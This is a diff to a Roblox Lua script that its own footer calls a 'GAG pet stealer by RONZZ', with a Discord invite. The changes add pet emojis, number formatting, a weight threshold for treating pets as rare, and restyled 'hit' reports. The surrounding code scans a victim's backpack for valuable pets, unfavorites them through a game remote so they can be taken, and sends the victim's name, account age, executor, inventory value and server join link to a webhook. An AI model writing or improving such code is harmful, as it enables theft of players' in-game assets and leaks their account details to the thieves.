@@ -51,11 +51,36 @@ local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
 local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "Queen Bee", "T-Rex", "Fennec Fox", "Butterfly", "Disco Bee", "Mimic Octopus", "Kitsune", "Spinosaurus"}
 local mutationKeywords = {"Ascended", "Inverted", "Rainbow", "Radiant", "IronSkin", "Golden", "Tiny", "Frozen", "Windy", "Mega", "Shiny", "Shocked"}
 
-local function isRarePet(petName)
+-- Emoji map for pet types
+local petEmojis = {
+    ["Fennec Fox"] = "🦊",
+    ["Butterfly"] = "🦋",
+    ["Dragonfly"] = "🐉",
+    ["Red Fox"] = "🦊",
+    ["Raccoon"] = "🦝",
+    ["Queen Bee"] = "🐝",
+    ["T-Rex"] = "🦖",
+    ["Disco Bee"] = "🐝",
+    ["Mimic Octopus"] = "🐙",
+    ["Kitsune"] = "🦊",
+    ["Spinosaurus"] = "🦖"
+}
+
+local function getPetEmoji(petName, weight)
+    if weight >= 25 then
+        return "💪"
+    end
+    return petEmojis[petName] or "🦊"
+end
+
+local function isRarePet(petName, weight)
     for _, rare in ipairs(rarePets) do
         if string.find(petName, rare) then
             return true
         end
+    end
+    if weight and weight >= 25 then
+        return true
     end
     return false
 end
@@ -178,6 +203,21 @@ local function formatNumber(number)
     end
 end
 
+-- Update number formatting to always use commas and full numbers
+local function formatNumber(number)
+    if number == nil then
+        return "0"
+    end
+    local formatted = tostring(number)
+    local k
+    while true do  
+        formatted, k = string.gsub(formatted, "(%d)(%d%d%d)([^%d])", '%1,%2%3')
+        if k == 0 then break end
+    end
+    formatted = formatted:reverse():gsub("(%d%d%d)(%d)", "%1,%2"):reverse()
+    return formatted
+end
+
 -- Weight extraction function
 local function getWeight(tool)
     local weightValue = tool:FindFirstChild("Weight") or 
@@ -248,7 +288,8 @@ local function SendJoinMessage(list, prefix)
     local backpackLines = {}
     for _, item in ipairs(list) do
         if item.Type == "Pet" then
-            table.insert(backpackLines, string.format("🦊 - %s [%.2f KG] [Age %s] → %s¢", item.Name, item.Weight, tostring(item.Age), formatNumber(item.Value)))
+            local emoji = getPetEmoji(item.Name, item.Weight)
+            table.insert(backpackLines, string.format("%s - %s [%.2f KG] [Age %s] → %s¢", emoji, item.Name, item.Weight, tostring(item.Age), formatNumber(item.Value)))
         elseif item.Type == "Plant" then
             -- Example for plants, adjust as needed
             table.insert(backpackLines, string.format("🍄 - [%s] → %s¢", item.Name, formatNumber(item.Value)))
@@ -264,32 +305,26 @@ local function SendJoinMessage(list, prefix)
     local placeId = tostring(game.PlaceId or "N/A")
 
     -- Build the embed description
-    local description = string.format([[
+    local description = string.format([[ 
 :bust_in_silhouette: **Player Information**
-Name: %s
+```Name: %s
 Receiver: %s
 Executor: %s
-Account Age: %s days
-
+Account Age: %s days```
 :moneybag: **Total Value**
-%s
-
+```%s```
 :palm_tree: **Backpack**
-%s
-
-:maple_leaf: **Hits**
-%s
-
+```%s```
 :island: **Join with URL**
 %s
-%s | %s
-]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, hitsStr, joinUrl, placeId, jobId)
+-# %s | %s
+]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrl, placeId, jobId)
 
     local data = {
         ["content"] = "",
         ["embeds"] = {{
             ["title"] = ":potted_plant: Grow A Garden Hit - DARK SCRIPTS :four_leaf_clover:",
-            ["color"] = 3066993, -- Green, change as you like
+            ["color"] = 16711680, -- Red
             ["description"] = description,
             ["footer"] = {
                 ["text"] = "GAG pet stealer by RONZZ. discord.gg/GY2RVSEGDT"
@@ -371,7 +406,7 @@ for _, tool in ipairs(backpack:GetChildren()) do
                         local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                         local petAge = tonumber(toolName:match("%[Age%s*(%d+)%]")) or "N/A"
                         -- Only include rare pets and their mutated forms
-                        if isRarePet(itemName) then
+                        if isRarePet(itemName, weight) then
                             if tool:GetAttribute("Favorite") then
                                 local success = pcall(function()
                                     replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
@@ -384,7 +419,7 @@ for _, tool in ipairs(backpack:GetChildren()) do
                             totalValue = totalValue + value
                             table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
                             debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
-                        elseif hasMutation(itemName) and isRarePet(itemName) then
+                        elseif hasMutation(itemName) and isRarePet(itemName, weight) then
                             -- Mutated rare pets
                             if tool:GetAttribute("Favorite") then
                                 local success = pcall(function()
